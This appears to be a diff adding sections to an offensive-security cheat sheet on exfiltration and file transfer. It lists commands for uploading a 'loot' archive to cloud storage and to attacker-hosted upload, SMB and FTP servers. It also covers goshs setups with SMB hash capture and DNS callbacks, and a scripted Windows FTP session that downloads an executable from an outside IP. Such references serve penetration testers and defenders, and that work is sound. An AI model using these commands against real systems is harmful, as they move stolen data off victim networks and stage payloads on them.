@@ -60,3 +60,25 @@ curl -X PUT -T loot.7z "https://bucket.s3.amazonaws.com/loot.7z?<presigned>"
 curl -X PUT --data-binary @loot.7z -H "x-ms-blob-type: BlockBlob" "https://acct.blob.core.windows.net/container/loot.7z?<sas>"
 ```
 
+## Quick File Hosting (Exfil Servers)
+
+|Tool|Command / Notes|
+|---|---|
+|**Python Upload**|`python3 -m uploadserver`  <br>`curl -X POST http://HOST/upload -F 'files=@file.txt'`|
+|**goshs** (Swiss Army)|`goshs -s -ss` (HTTPS)  <br>`goshs -smb -smb-domain CORP` (SMB + Hash Capture)  <br>`goshs -dns -dns-ip 10.10.10.10` (DNS Callback)|
+|**Simple HTTPS**|`openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes`  <br>Use provided Python2/3 or Flask snippets to host.|
+## File Transfer Protocols (FTP/SMB/SCP)
+
+### FTP
+
+- **Server (Python):** `python3 -m pyftpdlib -p 21`
+- **Windows Client:** Script an FTP text file and execute: `ftp -n -v -s:ftp.txt`
+
+```bash
+open 10.11.0.41 21
+USER anonymous
+anonymous
+bin
+GET file.exe
+bye
+```
